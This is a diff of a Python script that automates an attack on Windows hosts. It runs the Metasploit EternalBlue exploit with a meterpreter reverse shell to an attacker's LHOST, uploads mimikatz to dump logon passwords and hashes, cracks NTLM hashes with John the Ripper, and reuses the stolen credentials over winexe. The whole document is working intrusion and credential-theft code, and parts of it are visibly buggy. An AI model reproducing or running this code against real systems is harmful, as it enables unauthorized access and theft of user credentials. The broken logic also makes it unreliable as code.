@@ -5,34 +5,46 @@ import re
 from pymetasploit3.msfrpc import MsfRpcClient
 from pymetasploit3.msfconsole import MsfRpcConsole
 
-#this function will start mamkatz on victim`s computer
+
 def power_mimikatz(log, pswd, mimikatz_directory, victim_ip):
-	res = subprocess.check_output(['winexe', '-U', log+'%'+pswd, '//'+victim_ip, mimikatz_directory+'\\mimikatz.exe privilege::debug sekurlsa::logonPasswords full exit'])
+	"""
+	start mamkatz on victim`s computer
+	"""
+	res = subprocess.check_output(['winexe', '-U', log+'%'+pswd,
+								   '//'+victim_ip, mimikatz_directory+
+								   '\\mimikatz.exe privilege::debug '
+								   'sekurlsa::logonPasswords full exit'])
 	#decoding and parsing mimikatz result 
 	res = res.decode("utf-8")
-	login_pswd = re.findall("Username : ([\\s\\S]+?)\r\n[\\s\\S]+?Password : ([\\s\\S]+?)\r\n", res)
+	login_pswd = re.findall("Username : ([\\s\\S]+?)\r\n[\\s\\S]+?"
+							"Password : ([\\s\\S]+?)\r\n", res)
 	#making dictionaries with "good_creds"
 	good_cred = []
 	for one_login_pswd in login_pswd:
 		good_dict = {}
 		if one_login_pswd[0] != '(null)' and one_login_pswd[1] != '(null)':
 			good_dict['login'] = one_login_pswd[0]
-			good_dict['password'] = onone_login_pswd[1]
+			good_dict['password'] = one_login_pswd[1]
 			good_cred.append(good_dict)
 	return good_cred
 
-#this function will start meterpreter session with victim`s computer 
+
 def exploit(client, rhosts, lhosts, lport):
+	"""
+	start meterpreter session with victim`s computer
+	"""
 	try:
 		#сhecking the system for the vulnerability of EternalBlue
 		exploit = client.modules.use('auxiliary', 'scanner/smb/smb_ms17_010')
 		exploit['RHOSTS'] = rhosts
 		res = exploit.execute()
 		#use enternal_blue exploit
-		exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
+		exploit = client.modules.use('exploit',
+									 'windows/smb/ms17_010_eternalblue')
 		exploit['RHOSTS'] = rhosts
 		#creating payload
-		payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+		payload = client.modules.use('payload',
+									 'windows/x64/meterpreter/reverse_tcp')
 		payload['LHOST'] = lhosts
 		payload['LPORT'] = lport
 		exploit.execute(payload=payload)
@@ -41,12 +53,16 @@ def exploit(client, rhosts, lhosts, lport):
 		return True
 	except Exception as e:
             logger.exception(
-                "Exploit failed! (You can add some 'sleeps' while setting exploit)"
+                "Exploit failed! (You can add some "
+				"'sleeps' while setting exploit)"
                 f"exception: {e}"
             )
         raise e
 
 def get_pswd_from_hash(filename):
+	"""
+	getting password from ntlm hash
+	"""
 	f = open(filename, 'r')
 	data = f.read()
 	data = data.split('\n')
@@ -54,8 +70,10 @@ def get_pswd_from_hash(filename):
 	for user in data:
 		user_split = user.split(':')
 		try:
-			#first condition because of user`s ntlm begins after 999, second because of true users haven`t got $ in name
-			#this "if" is to get ntlm of user`s accounts which was created manually 
+			#first condition because of user`s ntlm begins after 999,
+			# second because of true users haven`t got $ in name
+			#this "if" is to get ntlm of user`s accounts
+			# which was created manually
 			if (int(user_split[1]) > 999) and (user_split[0].find('$') == -1):
 				norm_user = user
 				break
@@ -99,39 +117,61 @@ def get_pswd_from_hash(filename):
 	#if there was no match in john.pot
 	#starting brute
 	if pswd == '':
-		res = subprocess.check_output(['john', 'getting_hash.txt', '--format=NT']) 
+		res = subprocess.check_output(['john', 'getting_hash.txt',
+									   '--format=NT'])
 		res = res.decode("utf-8").split('\n')
 		log_pass = res[1].split('(')
 		pswd = log_pass[0].strip()
 		login = log_pass[1].split(')')[0]
 	return login, pswd
 
-def main():
-	msf_rpc_client_password = input("enter MsfRpc password: ")
-	client = MsfRpcClient(msf_rpc_client_password, ssl="False")
-	exploit(client, rhosts, lhosts, lport)
+
+def start_mimi(tmp_file, client, mimikatz_directory):
+	"""
+	Upload mimikatz to victim`s computer
+	"""
 	#getting all started sessions in MsfRpcd and choose the last
 	last_session = list(client.sessions.list.keys())[-1]
 	shell = client.sessions.session(str(last_session))
-	#uploading mimikatz
+	# uploading mimikatz
 	shell.write('mkdir C:/mimi/')
 	shell.write('mkdir C:/mimi/Win32/')
 	shell.write('mkdir C:/mimi/x64/')
-	shell.write('upload /home/lipa/Desktop/scropts/mimi/ C:/mimi/')
-	shell.write('upload /home/lipa/Desktop/scropts/mimi/Win32 C:/mimi/Win32')
-	shell.write('upload /home/lipa/Desktop/scropts/mimi/x64 C:/mimi/x64')
-	shell.write('hashdump')
-	pswd = ' '
-	pswd = shell.read()
-	#the hash may not be obtained the first time
+	shell.write('upload ' + mimikatz_directory + ' C:/mimikatz/')
+	shell.write('upload '+	mimikatz_directory + '/Win32 C:/mimi/Win32')
+	shell.write('upload ' + mimikatz_directory + '/x64 C:/mimi/x64')
+	shell.write('shell')
+	shell.write('cd C:/mimi/x64')
+	shell.write('mimikatz.exe')
+	shell.write('privilege::debug')
+	shell.write('sekurlsa::logonPasswords')
+	passwords = shell.read()
+	# the hash may not be obtained the first time
 	while pswd == ' ':
 		shell.write('hashdump')
 		pswd = shell.read()
-	fp = open('d.txt','w+')
+	fp = open(tmp_file, 'w+')
 	fp.write(pswd)
 	fp.close()
-	login, pswd= get_pswd_from_hash('d.txt')
-	good_cred = power_mimikatz(str(login), str(pswd))
+
+def main():
+	tmp_file = 'd.txt'
+	mimikatz_directory = input("enter mimikatz directory on your computer "
+							   "(Ex: home/user/mimikatz): ")
+	msf_rpc_client_password = input("enter MsfRpc password: ")
+	victim_ip = input("enter victim ip: ")
+	client = MsfRpcClient(msf_rpc_client_password, ssl="False")
+	rhosts = input("enter rhost: ")
+	lhosts = input("enter lhosts: ")
+	lport = input("enter lport: ")
+	exploit(client, rhosts, lhosts, lport)
+	start_mimi(tmp_file, client, mimikatz_directory)
+	login, pswd= get_pswd_from_hash(tmp_file)
+	good_cred = power_mimikatz(str(login), str(pswd), mimikatz_directory,
+							   victim_ip)
+	with open('good_creds.txt', 'w') as f:
+		f.write(good_cred)
+
 
 if __name__ == "__main__":
 	main()
